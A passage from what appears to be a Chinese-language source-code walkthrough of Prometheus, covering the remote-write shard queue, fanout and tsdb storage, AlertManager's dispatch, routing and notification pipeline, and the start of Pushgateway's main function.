(s *shards) enqueue(sample *model.Sample) bool {\n\ts.qm.samplesIn.incr(1)\n\n\tfp := sample.Metric.FastFingerprint()\n\tshard := uint64(fp) % uint64(len(s.queues))\n\n\tselect {\n\tcase s.queues[shard] <- sample:\n\t\treturn true\n\tdefault:\n\t\treturn false\n\t}\n}\n```\n\n这个队列存储里面用余数去分组的。\n\n使用start方法来启动队列发送任务：\n\n```go\nfunc (s *shards) start() {\n\tfor i := 0; i < len(s.queues); i++ {\n\t\tgo s.runShard(i)\n\t}\n}\n```\n\n函数runShared生成多个协程去执行：\n\n```go\nfunc (s *shards) runShard(i int) {\n\tdefer s.wg.Done()\n\tqueue := s.queues[i]\n\n\t// Send batches of at most MaxSamplesPerSend samples to the remote storage.\n\t// If we have fewer samples than that, flush them out after a deadline\n\t// anyways.\n\tpendingSamples := model.Samples{}\n\n\tfor {\n\t\tselect {\n\t\tcase sample, ok := <-queue:\n\t\t\tif !ok {\n\t\t\t\tif len(pendingSamples) > 0 {\n\t\t\t\t\tlevel.Debug(s.qm.logger).Log(\"msg\", \"Flushing samples to remote storage...\", \"count\", len(pendingSamples))\n\t\t\t\t\ts.sendSamples(pendingSamples)\n\t\t\t\t\tlevel.Debug(s.qm.logger).Log(\"msg\", \"Done flushing.\")\n\t\t\t\t}\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tqueueLength.WithLabelValues(s.qm.queueName).Dec()\n\t\t\tpendingSamples = append(pendingSamples, sample)\n\n\t\t\tfor len(pendingSamples) >= s.qm.cfg.MaxSamplesPerSend {\n\t\t\t\ts.sendSamples(pendingSamples[:s.qm.cfg.MaxSamplesPerSend])\n\t\t\t\tpendingSamples = pendingSamples[s.qm.cfg.MaxSamplesPerSend:]\n\t\t\t}\n\t\tcase <-time.After(s.qm.cfg.BatchSendDeadline):\n\t\t\tif len(pendingSamples) > 0 {\n\t\t\t\ts.sendSamples(pendingSamples)\n\t\t\t\tpendingSamples = pendingSamples[:0]\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n其中调用了方法sendSamples去发送样本：\n\n```go\nfunc (s *shards) sendSamples(samples model.Samples) {\n\tbegin := time.Now()\n\ts.sendSamplesWithBackoff(samples)\n\n\t// These counters are used to caclulate the dynamic sharding, and as such\n\t// should be maintained irrespective of success or failure.\n\ts.qm.samplesOut.incr(int64(len(samples)))\n\ts.qm.samplesOutDuration.incr(int64(time.Since(begin)))\n}\n```\n\n其中方法使用了samplesOut和samplesOutDuration来计算分片的动态变化。保证成功发送和失败的数目。\n\n启动调用函数sendSamplesWithBackOff函数来保证远程发送的时候失败的情况：\n\n```go\nfunc (s *shards) sendSamplesWithBackoff(samples model.Samples) {\n\tbackoff := s.qm.cfg.MinBackoff\n\tfor retries := s.qm.cfg.MaxRetries; retries > 0; retries-- {\n\t\tbegin := time.Now()\n\t\treq := ToWriteRequest(samples)\n\t\terr := s.qm.client.Store(req)\n\n\t\tsentBatchDuration.WithLabelValues(s.qm.queueName).Observe(time.Since(begin).Seconds())\n\t\tif err == nil {\n\t\t\tsucceededSamplesTotal.WithLabelValues(s.qm.queueName).Add(float64(len(samples)))\n\t\t\treturn\n\t\t}\n\n\t\tlevel.Warn(s.qm.logger).Log(\"msg\", \"Error sending samples to remote storage\", \"count\", len(samples), \"err\", err)\n\t\tif _, ok := err.(recoverableError); !ok {\n\t\t\tbreak\n\t\t}\n\t\ttime.Sleep(backoff)\n\t\tbackoff = backoff * 2\n\t\tif backoff > s.qm.cfg.MaxBackoff {\n\t\t\tbackoff = s.qm.cfg.MaxBackoff\n\t\t}\n\t}\nfailedSamplesTotal.WithLabelValues(s.qm.queueName).Add(float64(len(samples)))\n}\n```\n\n如果发送失败会重试几次，如果还是失败，会将发送失败的样本计入失败的计算器。\n\n如果成功，会调用Client中的Store方法：\n\n```go\nfunc (c *Client) Store(req *prompb.WriteRequest) error {\n\tdata, err := proto.Marshal(req)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tcompressed := snappy.Encode(nil, data)\n\thttpReq, err := http.NewRequest(\"POST\", c.url.String(), bytes.NewReader(compressed))\n\tif err != nil {\n\t\t// Errors from NewRequest are from unparseable URLs, so are not\n\t\t// recoverable.\n\t\treturn err\n\t}\n\thttpReq.Header.Add(\"Content-Encoding\", \"snappy\")\n\thttpReq.Header.Set(\"Content-Type\", \"application/x-protobuf\")\n\thttpReq.Header.Set(\"X-Prometheus-Remote-Write-Version\", \"0.1.0\")\n\n\tctx, cancel := context.WithTimeout(context.Background(), c.timeout)\n\tdefer cancel()\n\n\thttpResp, err := ctxhttp.Do(ctx, c.client, httpReq)\n\tif err != nil {\n\t\t// Errors from client.Do are from (for example) network errors, so are\n\t\t// recoverable.\n\t\treturn recoverableError{err}\n\t}\n\tdefer httpResp.Body.Close()\n\n\tif httpResp.StatusCode/100 != 2 {\n\t\tscanner := bufio.NewScanner(io.LimitReader(httpResp.Body, maxErrMsgLen))\n\t\tline := \"\"\n\t\tif scanner.Scan() {\n\t\t\tline = scanner.Text()\n\t\t}\n\t\terr = fmt.Errorf(\"server returned HTTP status %s: %s\", httpResp.Status, line)\n\t}\n\tif httpResp.StatusCode/100 == 5 {\n\t\treturn recoverableError{err}\n\t}\n\treturn err\n}\n```\n\n通过post方式，发送数据。\n\n本地存储主要使用的tsdb库中，后面的版本对tsdb有较为大的变化。\n\nfanout为本地和远程的读写代理器，入口在fanout中，fanout的数据结构\n\n```go\ntype fanout struct {\n\tlogger log.Logger\n\n\tprimary     Storage\n\tsecondaries []Storage\n}\n```\n\n初始化数据结构：\n\n```go\n// NewFanout returns a new fan-out Storage, which proxies reads and writes\n// through to multiple underlying storages.\nfunc NewFanout(logger log.Logger, primary Storage, secondaries ...Storage) Storage {\n\treturn &fanout{\n\t\tlogger:      logger,\n\t\tprimary:     primary,\n\t\tsecondaries: secondaries,\n\t}\n}\n```\n\n添加数据使用appender方法：\n\n```go\nfunc (f *fanout) Appender() (Appender, error) {\n\tprimary, err := f.primary.Appender()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tsecondaries := make([]Appender, 0, len(f.secondaries))\n\tfor _, storage := range f.secondaries {\n\t\tappender, err := storage.Appender()\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tsecondaries = append(secondaries, appender)\n\t}\n\treturn &fanoutAppender{\n\t\tlogger:      f.logger,\n\t\tprimary:     primary,\n\t\tsecondaries: secondaries,\n\t}, nil\n}\n```\n\n本地存储使用tsdb来存储：\n\nprometheus中提供了接口，调用tsdb数据库来进行存储。tsdb后续单独来说明。\n\n打开一个db库函数：\n\n```go\nfunc Open(path string, l log.Logger, r prometheus.Registerer, opts *Options) (*tsdb.DB, error) {\n\tif opts.MinBlockDuration > opts.MaxBlockDuration {\n\t\topts.MaxBlockDuration = opts.MinBlockDuration\n\t}\n\t// Start with smallest block duration and create exponential buckets until the exceed the\n\t// configured maximum block duration.\n\trngs := tsdb.ExponentialBlockRanges(int64(time.Duration(opts.MinBlockDuration).Seconds()*1000), 10, 3)\n\n\tfor i, v := range rngs {\n\t\tif v > int64(time.Duration(opts.MaxBlockDuration).Seconds()*1000) {\n\t\t\trngs = rngs[:i]\n\t\t\tbreak\n\t\t}\n\t}\n\n\tdb, err := tsdb.Open(path, l, r, &tsdb.Options{\n\t\tWALFlushInterval:  10 * time.Second,\n\t\tRetentionDuration: uint64(time.Duration(opts.Retention).Seconds() * 1000),\n\t\tBlockRanges:       rngs,\n\t\tNoLockfile:        opts.NoLockfile,\n\t})\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn db, nil\n}\n```\n\n\n\n## AlertManager\n\n接收告警信息请求的地址为：http://localhost:9093/api/v1/alerts，api接收告警信息后会进入到api.addAlerts中。\n\nAlertManager服务启动时候，api.addAlerts方法会通过api.Register方法再路由中完成路由请求地址的注册。\n\n在api.addAlerts方法中，会将从参数r中接受到的告警信息解析为types.Alert数组，最后将其插入本地缓存中。\n\n```go\nfunc (api *API) addAlerts(w http.ResponseWriter, r *http.Request) {\n\tvar alerts []*types.Alert\n\tif err := receive(r, &alerts); err != nil {\n\t\trespondError(w, apiError{\n\t\t\ttyp: errorBadData,\n\t\t\terr: err,\n\t\t}, nil)\n\t\treturn\n\t}\n\n\tapi.insertAlerts(w, r, alerts...)\n}\n\nfunc receive(r *http.Request, v interface{}) error {\n\tdec := json.NewDecoder(r.Body)\n\tdefer r.Body.Close()\n\n\terr := dec.Decode(v)\n\tif err != nil {\n\t\tlog.Debugf(\"Decoding request failed: %v\", err)\n\t}\n\treturn err\n}\n```\n\n告警调度：\n\n告警信息被插入AlertManager本地缓存后，会通过告警调度服务从本地缓存中获取告警信息，并将告警信息发送出去。\n\n本地缓存基于内存实现，\n\n告警调度服务的初始化代码在main中，reload方法完成，\n\n```go\nreload := func() (err error) {\n\t\tlog.With(\"file\", *configFile).Infof(\"Loading configuration file\")\n\t\tdefer func() {\n\t\t\tif err != nil {\n\t\t\t\tlog.With(\"file\", *configFile).Errorf(\"Loading configuration file failed: %s\", err)\n\t\t\t\tconfigSuccess.Set(0)\n\t\t\t} else {\n\t\t\t\tconfigSuccess.Set(1)\n\t\t\t\tconfigSuccessTime.Set(float64(time.Now().Unix()))\n\t\t\t\tconfigHash.Set(hash)\n\t\t\t}\n\t\t}()\n\n\t\tconf, plainCfg, err := config.LoadFile(*configFile)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\thash = md5HashAsMetricValue(plainCfg)\n\n\t\terr = apiv.Update(conf, time.Duration(conf.Global.ResolveTimeout))\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\ttmpl, err = template.FromGlobs(conf.Templates...)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t\ttmpl.ExternalURL = amURL\n\n\t\tinhibitor.Stop()\n\t\tdisp.Stop()\n\n\t\tinhibitor = inhibit.NewInhibitor(alerts, conf.InhibitRules, marker)\n\t\tpipeline = notify.BuildPipeline(\n\t\t\tconf.Receivers,\n\t\t\ttmpl,\n\t\t\twaitFunc,\n\t\t\tinhibitor,\n\t\t\tsilences,\n\t\t\tnotificationLog,\n\t\t\tmarker,\n\t\t)\n\t\tdisp = dispatch.NewDispatcher(alerts, dispatch.NewRoute(conf.Route, nil), pipeline, marker, timeoutFunc)\n\n\t\tgo disp.Run()\n\t\tgo inhibitor.Run()\n\n\t\treturn nil\n\t}\n```\n\nRun方法具体实现如下：\n\n```go\n\n// Run starts dispatching alerts incoming via the updates channel.\nfunc (d *Dispatcher) Run() {\n\td.done = make(chan struct{})\n\n\td.mtx.Lock()\n\td.aggrGroups = map[*Route]map[model.Fingerprint]*aggrGroup{}\n\td.mtx.Unlock()\n\n\td.ctx, d.cancel = context.WithCancel(context.Background())\n\n\td.run(d.alerts.Subscribe())\n\tclose(d.done)\n}\n```\n\nSubscribe方法：\n\n```go\n\n// Subscribe returns an iterator over active alerts that have not been\n// resolved and successfully notified about.\n// They are not guaranteed to be in chronological order.\nfunc (a *Alerts) Subscribe() provider.AlertIterator {\n\tvar (\n\t\tch   = make(chan *types.Alert, 200)\n\t\tdone = make(chan struct{})\n\t)\n\talerts, err := a.getPending()\n\n\ta.mtx.Lock()\n\ti := a.next\n\ta.next++\n\ta.listeners[i] = ch\n\ta.mtx.Unlock()\n\n\tgo func() {\n\t\tdefer func() {\n\t\t\ta.mtx.Lock()\n\t\t\tdelete(a.listeners, i)\n\t\t\tclose(ch)\n\t\t\ta.mtx.Unlock()\n\t\t}()\n\t\t//遍历告警列表\n\t\tfor _, a := range alerts {\n\t\t\tselect {\n                //将告警信息放入通道ch中\n\t\t\tcase ch <- a:\n\t\t\tcase <-done:\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\t<-done\n\t}()\n\t//构建告警信息迭代器\n\treturn provider.NewAlertIterator(ch, done, err)\n}\n\n// NewAlertIterator returns a new AlertIterator based on the generic alertIterator type\nfunc NewAlertIterator(ch <-chan *types.Alert, done chan struct{}, err error) AlertIterator {\n\treturn &alertIterator{\n\t\tch:   ch,\n\t\tdone: done,\n\t\terr:  err,\n\t}\n}\n```\n\nrun方法中，对告警信息的处理分为4步：获取告警信息，告警路由匹配，告警信息处理，清除告警信息为空的aggrGroup。\n\n```go\nfunc (d *Dispatcher) run(it provider.AlertIterator) {\n\tcleanup := time.NewTicker(30 * time.Second)\n\tdefer cleanup.Stop()\n\n\tdefer it.Close()\n\n\tfor {\n\t\tselect {\n\t\tcase alert, ok := <-it.Next():\n\t\t\tif !ok {\n\t\t\t\t// Iterator exhausted for some reason.\n\t\t\t\tif err := it.Err(); err != nil {\n\t\t\t\t\tlog.Errorf(\"Error on alert update: %s\", err)\n\t\t\t\t}\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\td.log.With(\"alert\", alert).Debug(\"Received alert\")\n\n\t\t\t// Log errors but keep trying.\n\t\t\tif err := it.Err(); err != nil {\n\t\t\t\tlog.Errorf(\"Error on alert update: %s\", err)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\t//告警信息路由匹配\n\t\t\tfor _, r := range d.route.Match(alert.Labels) {\n\t\t\t\td.processAlert(alert, r)\n\t\t\t}\n\n\t\tcase <-cleanup.C:\n\t\t\td.mtx.Lock()\n\t\t\t//每隔30s清除为空的告警组\n\t\t\tfor _, groups := range d.aggrGroups {\n\t\t\t\tfor _, ag := range groups {\n\t\t\t\t\tif ag.empty() {\n\t\t\t\t\t\tag.stop()\n\t\t\t\t\t\tdelete(groups, ag.fingerprint())\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\td.mtx.Unlock()\n\n\t\tcase <-d.ctx.Done():\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n流程：\n\n![1572418287763](/images/1572418287763.png)\n\n告警匹配：\n\nAlertManager以路由匹配方式实现了告警分组，不同分组下的告警可以使用各不同的告警接受方式，告警组等待时间，告警组发送间隔，重复告警发送间隔。\n\n```go\n// Match does a depth-first left-to-right search through the route tree\n// and returns the matching routing nodes.\nfunc (r *Route) Match(lset model.LabelSet) []*Route {\n\tif !r.Matchers.Match(lset) {\n\t\treturn nil\n\t}\n\n\tvar all []*Route\n\n\tfor _, cr := range r.Routes {\n\t\tmatches := cr.Match(lset)\n\n\t\tall = append(all, matches...)\n\n\t\tif matches != nil && !cr.Continue {\n\t\t\tbreak\n\t\t}\n\t}\n\n\t// If no child nodes were matches, the current node itself is a match.\n\tif len(all) == 0 {\n\t\tall = append(all, r)\n\t}\n\n\treturn all\n}\n```\n\n告警处理：\n\n```go\n// processAlert determines in which aggregation group the alert falls\n// and insert it.\nfunc (d *Dispatcher) processAlert(alert *types.Alert, route *Route) {\n\tgroup := model.LabelSet{}\n\t//获取分组的维度和纬度值\n\tfor ln, lv := range alert.Labels {\n\t\tif _, ok := route.RouteOpts.GroupBy[ln]; ok {\n\t\t\tgroup[ln] = lv\n\t\t}\n\t}\n\n\tfp := group.Fingerprint()\n\n\td.mtx.Lock()\n\tgroups, ok := d.aggrGroups[route]\n    //判断是否需要新建告警组\n\tif !ok {\n\t\tgroups = map[model.Fingerprint]*aggrGroup{}\n\t\td.aggrGroups[route] = groups\n\t}\n\td.mtx.Unlock()\n\n\t// If the group does not exist, create it.\n\tag, ok := groups[fp]\n    //判断是否新建路由组\n\tif !ok {\n\t\tag = newAggrGroup(d.ctx, group, route, d.timeout)\n\t\tgroups[fp] = ag\n\t\t//启动告警组\n\t\tgo ag.run(func(ctx context.Context, alerts ...*types.Alert) bool {\n\t\t\t_, _, err := d.stage.Exec(ctx, alerts...)\n\t\t\tif err != nil {\n\t\t\t\tlog.Errorf(\"Notify for %d alerts failed: %s\", len(alerts), err)\n\t\t\t}\n\t\t\treturn err == nil\n\t\t})\n\t}\n\n\tag.insert(alert)\n}\n```\n\nrun方法：\n\n```go\nfunc (ag *aggrGroup) run(nf notifyFunc) {\n\tag.done = make(chan struct{})\n\n\tdefer close(ag.done)\n\tdefer ag.next.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase now := <-ag.next.C:\n\t\t\t// Give the notifcations time until the next flush to\n\t\t\t// finish before terminating them.\n\t\t\tctx, cancel := context.WithTimeout(ag.ctx, ag.timeout(ag.opts.GroupInterval))\n\n\t\t\t// The now time we retrieve from the ticker is the only reliable\n\t\t\t// point of time reference for the subsequent notification pipeline.\n\t\t\t// Calculating the current time directly is prone to flaky behavior,\n\t\t\t// which usually only becomes apparent in tests.\n            //记录告警开始时间\n\t\t\tctx = notify.WithNow(ctx, now)\n\n\t\t\t// Populate context with information needed along the pipeline.\n\t\t\tctx = notify.WithGroupKey(ctx, ag.GroupKey())\n\t\t\tctx = notify.WithGroupLabels(ctx, ag.labels)\n\t\t\tctx = notify.WithReceiverName(ctx, ag.opts.Receiver)\n\t\t\tctx = notify.WithRepeatInterval(ctx, ag.opts.RepeatInterval)\n\n\t\t\t// Wait the configured interval before calling flush again.\n\t\t\tag.mtx.Lock()\n\t\t\tag.next.Reset(ag.opts.GroupInterval)\n\t\t\tag.mtx.Unlock()\n\n\t\t\tag.flush(func(alerts ...*types.Alert) bool {\n\t\t\t\treturn nf(ctx, alerts...)\n\t\t\t})\n\n\t\t\tcancel()\n\n\t\tcase <-ag.ctx.Done():\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\nflush方法中对告警信息进行两次复制，并分别将其缓存到alerts和alertsSlice中，告警信息通过传入的参数notify再次告警通知，之后再告警列表中删除过期的告警。\n\nflush方法：\n\n```go\n// flush sends notifications for all new alerts.\nfunc (ag *aggrGroup) flush(notify func(...*types.Alert) bool) {\n\tif ag.empty() {\n\t\treturn\n\t}\n\tag.mtx.Lock()\n\n\tvar (\n\t\talerts      = make(map[model.Fingerprint]*types.Alert, len(ag.alerts))\n\t\talertsSlice = make([]*types.Alert, 0, len(ag.alerts))\n\t)\n\tfor fp, alert := range ag.alerts {\n\t\talerts[fp] = alert\n\t\talertsSlice = append(alertsSlice, alert)\n\t}\n\n\tag.mtx.Unlock()\n\n\tag.log.Debugln(\"flushing\", alertsSlice)\n\n\tif notify(alertsSlice...) {\n\t\tag.mtx.Lock()\n\t\tfor fp, a := range alerts {\n\t\t\t// Only delete if the fingerprint has not been inserted\n\t\t\t// again since we notified about it.\n\t\t\tif a.Resolved() && ag.alerts[fp] == a {\n\t\t\t\tdelete(ag.alerts, fp)\n\t\t\t}\n\t\t}\n\n\t\tag.hasSent = true\n\t\tag.mtx.Unlock()\n\t}\n}\n```\n\n告警的过期时间由alertmanager.yml配置文件中的resolve_timeout配置项指定，默认5m.\n\nflush方法的notify参数为func(...*types.Alert) bool类型，而notify方法最终会调用d.stage.Exec进行告警处理。\n\n主要流程：\n\n![1572418713584](/images/1572418713584.png)\n\n\n\n告警通知：\n\n主要流程：\n\n1）main方法中调用notify.BuildPipeline方法生成RoutingStage，并作为参数传递到dispatcher的NewDispatcher方法中，从而完成调度器Dispatcher的构建，并将RoutingStage赋值给调度器成stage.\n\n2）processAlerts定义匿名回调方法func(ctx context.Context, alerts ... *types.Alert) bool 再匿名方法的实现调用d.stage.Exec(ctx, alerts...)发送告警。\n\nBuildPipeline构建一个执行的调用链，该链有RoutingStage，MultiStage,FanoutStage, inhibitStage, SilenceStage, WaitStage, DehupStage等多阶段。\n\n```go\n// BuildPipeline builds a map of receivers to Stages.\nfunc BuildPipeline(\n\tconfs []*config.Receiver,\n\ttmpl *template.Template,\n\twait func() time.Duration,\n\tinhibitor *inhibit.Inhibitor,\n\tsilences *silence.Silences,\n\tnotificationLog nflog.Log,\n\tmarker types.Marker,\n) RoutingStage {\n\trs := RoutingStage{}\n\n\tis := NewInhibitStage(inhibitor, marker)\n\tss := NewSilenceStage(silences, marker)\n\n\tfor _, rc := range confs {\n\t\trs[rc.Name] = MultiStage{is, ss, createStage(rc, tmpl, wait, notificationLog)}\n\t}\n\treturn rs\n}\n```\n\ncreateStage方法：\n\n```go\n// createStage creates a pipeline of stages for a receiver.\nfunc createStage(rc *config.Receiver, tmpl *template.Template, wait func() time.Duration, notificationLog nflog.Log) Stage {\n\tvar fs FanoutStage\n\tfor _, i := range BuildReceiverIntegrations(rc, tmpl) {\n\t\trecv := &nflogpb.Receiver{\n\t\t\tGroupName:   rc.Name,\n\t\t\tIntegration: i.name,\n\t\t\tIdx:         uint32(i.idx),\n\t\t}\n\t\tvar s MultiStage\n\t\ts = append(s, NewWaitStage(wait))\n\t\ts = append(s, NewDedupStage(notificationLog, recv, i.conf.SendResolved()))\n\t\ts = append(s, NewRetryStage(i))\n\t\ts = append(s, NewSetNotifiesStage(notificationLog, recv))\n\n\t\tfs = append(fs, s)\n\t}\n\treturn fs\n}\n```\n\nBuildReceiverIntegrations方法主要用于构建告警接收器对应的Notifier，兵器再alertmanager.yml配置文件中的每种告警接收器，可以定义多种Notifier。\n\n```go\n// BuildReceiverIntegrations builds a list of integration notifiers off of a\n// receivers config.\nfunc BuildReceiverIntegrations(nc *config.Receiver, tmpl *template.Template) []Integration {\n\tvar (\n\t\tintegrations []Integration\n\t\tadd          = func(name string, i int, n Notifier, nc notifierConfig) {\n\t\t\tintegrations = append(integrations, Integration{\n\t\t\t\tnotifier: n,\n\t\t\t\tconf:     nc,\n\t\t\t\tname:     name,\n\t\t\t\tidx:      i,\n\t\t\t})\n\t\t}\n\t)\n\n\tfor i, c := range nc.WebhookConfigs {\n\t\tn := NewWebhook(c, tmpl)\n\t\tadd(\"webhook\", i, n, c)\n\t}\n\tfor i, c := range nc.EmailConfigs {\n\t\tn := NewEmail(c, tmpl)\n\t\tadd(\"email\", i, n, c)\n\t}\n\tfor i, c := range nc.PagerdutyConfigs {\n\t\tn := NewPagerDuty(c, tmpl)\n\t\tadd(\"pagerduty\", i, n, c)\n\t}\n\tfor i, c := range nc.OpsGenieConfigs {\n\t\tn := NewOpsGenie(c, tmpl)\n\t\tadd(\"opsgenie\", i, n, c)\n\t}\n\tfor i, c := range nc.SlackConfigs {\n\t\tn := NewSlack(c, tmpl)\n\t\tadd(\"slack\", i, n, c)\n\t}\n\tfor i, c := range nc.HipchatConfigs {\n\t\tn := NewHipchat(c, tmpl)\n\t\tadd(\"hipchat\", i, n, c)\n\t}\n\tfor i, c := range nc.VictorOpsConfigs {\n\t\tn := NewVictorOps(c, tmpl)\n\t\tadd(\"victorops\", i, n, c)\n\t}\n\tfor i, c := range nc.PushoverConfigs {\n\t\tn := NewPushover(c, tmpl)\n\t\tadd(\"pushover\", i, n, c)\n\t}\n\treturn integrations\n}\n\n```\n\n以webhook类型Notifier为列，数据格式化之后，以post方式发送告警信息。\n\n```go\n// Notify implements the Notifier interface.\nfunc (w *Webhook) Notify(ctx context.Context, alerts ...*types.Alert) (bool, error) {\n\tdata := w.tmpl.Data(receiverName(ctx), groupLabels(ctx), alerts...)\n\n\tgroupKey, ok := GroupKey(ctx)\n\tif !ok {\n\t\tlog.Errorf(\"group key missing\")\n\t}\n\n\tmsg := &WebhookMessage{\n\t\tVersion:  \"4\",\n\t\tData:     data,\n\t\tGroupKey: groupKey,\n\t}\n\n\tvar buf bytes.Buffer\n\tif err := json.NewEncoder(&buf).Encode(msg); err != nil {\n\t\treturn false, err\n\t}\n\n\treq, err := http.NewRequest(\"POST\", w.URL, &buf)\n\tif err != nil {\n\t\treturn true, err\n\t}\n\treq.Header.Set(\"Content-Type\", contentTypeJSON)\n\treq.Header.Set(\"User-Agent\", userAgentHeader)\n\n\tresp, err := ctxhttp.Do(ctx, http.DefaultClient, req)\n\tif err != nil {\n\t\treturn true, err\n\t}\n\tresp.Body.Close()\n\n\treturn w.retry(resp.StatusCode)\n}\n```\n\n调用链的执行流程：\n\n![1572419260049](/images/1572419260049.png)\n\nRoutingStage阶段的Exec方法：\n\n```go\n// Exec implements the Stage interface.\nfunc (rs RoutingStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\treceiver, ok := ReceiverName(ctx)\n\tif !ok {\n\t\treturn ctx, nil, fmt.Errorf(\"receiver missing\")\n\t}\n\n\ts, ok := rs[receiver]\n\tif !ok {\n\t\treturn ctx, nil, fmt.Errorf(\"stage for receiver missing\")\n\t}\n\n\treturn s.Exec(ctx, alerts...)\n}\n```\n\n```go\n// Exec attempts to execute all stages concurrently and discards the results.\n// It returns its input alerts and a types.MultiError if one or more stages fail.\nfunc (fs FanoutStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar (\n\t\twg sync.WaitGroup\n\t\tme types.MultiError\n\t)\n\twg.Add(len(fs))\n\n\tfor _, s := range fs {\n\t\tgo func(s Stage) {\n\t\t\tif _, _, err := s.Exec(ctx, alerts...); err != nil {\n\t\t\t\tme.Add(err)\n\t\t\t\tlog.Errorf(\"Error on notify: %s\", err)\n\t\t\t}\n\t\t\twg.Done()\n\t\t}(s)\n\t}\n\twg.Wait()\n\n\tif me.Len() > 0 {\n\t\treturn ctx, alerts, &me\n\t}\n\treturn ctx, alerts, nil\n}\n```\n\n```go\n// Exec implements the Stage interface.\nfunc (ms MultiStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar err error\n\tfor _, s := range ms {\n\t\tif len(alerts) == 0 {\n\t\t\treturn ctx, nil, nil\n\t\t}\n\n\t\tctx, alerts, err = s.Exec(ctx, alerts...)\n\t\tif err != nil {\n\t\t\treturn ctx, nil, err\n\t\t}\n\t}\n\treturn ctx, alerts, nil\n}\n```\n\n告警抑制的配置，inhibit_rules配置项目：\n\n```go\n// Exec implements the Stage interface.\nfunc (n *InhibitStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar filtered []*types.Alert\n\tfor _, a := range alerts {\n\t\t_, ok := n.marker.Inhibited(a.Fingerprint())\n\t\t// TODO(fabxc): increment total alerts counter.\n\t\t// Do not send the alert if the silencer mutes it.\n\t\tif !n.muter.Mutes(a.Labels) {\n\t\t\t// TODO(fabxc): increment muted alerts counter.\n\t\t\tfiltered = append(filtered, a)\n\t\t\t// Store whether a previously inhibited alert is firing again.\n\t\t\ta.WasInhibited = ok\n\t\t}\n\t}\n\n\treturn ctx, filtered, nil\n}\n```\n\n告警静音：\n\n```go\n// Exec implements the Stage interface.\nfunc (n *SilenceStage) Exec(ctx context.Context, alerts ...*types.Alert) (context.Context, []*types.Alert, error) {\n\tvar filtered []*types.Alert\n\tfor _, a := range alerts {\n\t\t_, ok := n.marker.Silenced(a.Fingerprint())\n\t\t// TODO(fabxc): increment total alerts counter.\n\t\t// Do not send the alert if the silencer mutes it.\n\t\tsils, err := n.silences.Query(\n\t\t\tsilence.QState(silence.StateActive),\n\t\t\tsilence.QMatches(a.Labels),\n\t\t)\n\t\tif err != nil {\n\t\t\tlog.Errorf(\"Querying silences failed: %s\", err)\n\t\t}\n\n\t\tif len(sils) == 0 {\n\t\t\t// TODO(fabxc): increment muted alerts counter.\n\t\t\tfiltered = append(filtered, a)\n\t\t\tn.marker.SetSilenced(a.Labels.Fingerprint())\n\t\t\t// Store whether a previously silenced alert is firing again.\n\t\t\ta.WasSilenced = ok\n\t\t} else {\n\t\t\tids := make([]string, len(sils))\n\t\t\tfor i, s := range sils {\n\t\t\t\tids[i] = s.Id\n\t\t\t}\n\t\t\tn.marker.SetSilenced(a.Labels.Fingerprint(), ids...)\n\t\t}\n\t}\n\n\treturn ctx, filtered, nil\n}\n```\n\n\n\n## Pushgateway\n\npushgateway主要作用是允许临时任务和批作业向prometheus公开指标数据。主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这次 jobs 可以直接向 Prometheus server 端推送它们的 metrics。这种方式主要用于服务层面的 metrics，对于机器层面的 metrices，需要使用 node exporter。\n\npush gateway的代码逻辑都再main函数里面：\n\n```go\nfunc main() {\n\tvar (\n\t\tapp = kingpin.New(filepath.Base(os.Args[0]), \"The Pushgateway\")\n\n\t\tlistenAddress       = app.Flag(\"web.listen-address\", \"Address to listen on for the web interface, API, and telemetry.\").Default(\":9091\").String()\n\t\tmetricsPath         = app.Flag(\"web.telemetry-path\", \"Path under which to expose metrics.\").Default(\"/metrics\").String()\n\t\texternalURL         = app.Flag(\"web.external-url\", \"The URL under which the Pushgateway is externally reachable.\").Default(\"\").URL()\n\t\troutePrefix         = app.Flag(\"web.route-prefix\", \"Prefix for the internal routes of web endpoints. Defaults to the path of --web.external-url.\").Default(\"\").String()\n\t\tenableLifeCycle     = app.Flag(\"web.enable-lifecycle\", \"Enable shutdown via HTTP request.\").Default(\"false\").Bool()\n\t\tenableAdminAPI      = app.Flag(\"web.enable-admin-api\", \"Enable API endpoints for admin control actions.\").Default(\"false\").Bool()\n\t\tpersistenceFile     = app.Flag(\"persistence.file\", \"File to persist metrics. If empty, metrics are only kept in memory.\").Default(\"\").String()\n\t\tpersistenceInterval = app.Flag(\"persistence.interval\", \"The minimum interval at which to write out the persistence file.\").Default(\"5m\").Duration()\n\t\tpromlogConfig       = promlog.Config{}\n\t)\n\tpromlogflag.AddFlags(app, &promlogConfig)\n\tapp.Version(version.Print(\"pushgateway\"))\n\tapp.HelpFlag.Short('h')\n\tkingpin.MustParse(app.Parse(os.Args[1:]))\n\tlogger := promlog.New(&promlogConfig)\n\n\t*routePrefix = computeRoutePrefix(*routePrefix, *externalURL)\n\texternalPathPrefix := computeRoutePrefix(\"\", *externalURL)\n\n\tlevel.Info(logger).Log(\"msg\", \"starting pushgateway\", \"version\", version.Info())\n\tlevel.Info(logger).Log(\"build_context\", version.BuildContext())\n\tlevel.Debug(logger).Log(\"msg\", \"external URL\", \"url\", *externalURL)\n\tlevel.Debug(logger).Log(\"msg\", \"path prefix used externally\", \"path\", 